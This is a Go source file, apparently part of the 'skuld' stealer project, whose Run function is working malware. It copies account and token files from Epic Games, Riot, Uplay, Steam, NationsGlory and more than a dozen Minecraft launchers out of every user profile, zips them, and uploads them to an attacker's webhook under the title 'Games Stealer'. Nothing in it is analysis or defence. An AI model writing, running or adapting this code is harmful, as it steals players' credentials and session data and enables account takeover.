package games

import (
	"fmt"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/requests"
	"os"
	"path/filepath"
	"strings"
)

func Run(webhook string) {
	for _, user := range hardware.GetUsers() {
		paths := map[string]map[string]string{
			"Epic Games": {
				"Settings": filepath.Join(user, "AppData", "Local", "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini"),
			},
			"Minecraft": {
				"Intent":          filepath.Join(user, "intentlauncher", "launcherconfig"),
				"Lunar":           filepath.Join(user, ".lunarclient", "settings", "game", "accounts.json"),
				"TLauncher":       filepath.Join(user, "AppData", "Roaming", ".minecraft", "TlauncherProfiles.json"),
				"Feather":         filepath.Join(user, "AppData", "Roaming", ".feather", "accounts.json"),
				"Meteor":          filepath.Join(user, "AppData", "Roaming", ".minecraft", "meteor-client", "accounts.nbt"),
				"Impact":          filepath.Join(user, "AppData", "Roaming", ".minecraft", "Impact", "alts.json"),
				"Novoline":        filepath.Join(user, "AppData", "Roaming", ".minecraft", "Novoline", "alts.novo"),
				"CheatBreakers":   filepath.Join(user, "AppData", "Roaming", ".minecraft", "cheatbreaker_accounts.json"),
				"Microsoft Store": filepath.Join(user, "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json"),
				"Rise":            filepath.Join(user, "AppData", "Roaming", ".minecraft", "Rise", "alts.txt"),
				"Rise (Intent)":   filepath.Join(user, "intentlauncher", "Rise", "alts.txt"),
				"Paladium":        filepath.Join(user, "AppData", "Roaming", "paladium-group", "accounts.json"),
				"PolyMC":          filepath.Join(user, "AppData", "Roaming", "PolyMC", "accounts.json"),
				"Badlion":         filepath.Join(user, "AppData", "Roaming", "Badlion Client", "accounts.json"),
			},
			"Riot Games": {
				"Config": filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Config"),
				"Data":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Data"),
				"Logs":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Logs"),
			},
			"Uplay": {
				"Settings": filepath.Join(user, "AppData", "Local", "Ubisoft Game Launcher"),
			},
			"NationsGlory": {
				"Local Storage": filepath.Join(user, "AppData", "Roaming", "NationsGlory", "Local Storage", "leveldb"),
			},
		}

		tempdir := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s", strings.Split(user, "\\")[2]))
		found := ""
		for name, path := range paths {
			dest := filepath.Join(tempdir, strings.Split(user, "\\")[2], name)

			err := os.MkdirAll(dest, os.ModePerm)
			if err != nil {
				continue
			}

			for fname, fpath := range path {
				if filepath.Ext(fpath) != "" {
					os.MkdirAll(filepath.Join(dest, fname), os.ModePerm)
					err = fileutil.CopyFile(fpath, filepath.Join(dest, fname, filepath.Base(fpath)))
				} else {
					err = fileutil.CopyDir(fpath, filepath.Join(dest, fname))
				}

				if err != nil {
					continue
				}

				if !strings.Contains(found, name) {
					found += fmt.Sprintf("\n✅ %s ", name)
				}
			}

		}

		if found == "" {
			os.RemoveAll(tempdir)
			continue
		}

		tempzip := filepath.Join(os.TempDir(), "games.zip")

		err := fileutil.Zip(tempdir, tempzip)
		if err != nil {
			os.RemoveAll(tempdir)
			continue
		}

		requests.Webhook(webhook, map[string]interface{}{
			"embeds": []map[string]interface{}{
				{
					"title":       "Games Stealer - " + strings.Split(user, "\\")[2],
					"description": "```" + found + "```",
				},
			},
		}, tempzip)

		os.RemoveAll(tempdir)
		os.Remove(tempzip)
	}

	tempdir := fmt.Sprintf("%s\\%s", os.TempDir(), "steam-temp")
	defer os.RemoveAll(tempdir)

	path := "C:\\Program Files (x86)\\Steam\\config"
	if !fileutil.IsDir(path) {
		return
	}

	err := fileutil.CopyDir(path, tempdir)
	if err != nil {
		return
	}

	tempzip := filepath.Join(os.TempDir(), "steam.zip")
	err = fileutil.Zip(tempdir, tempzip)
	if err != nil {
		return
	}
	defer os.Remove(tempzip)

	requests.Webhook(webhook, map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       "Steam",
				"description": "`✅✅✅`",
			},
		},
	}, tempzip)
}
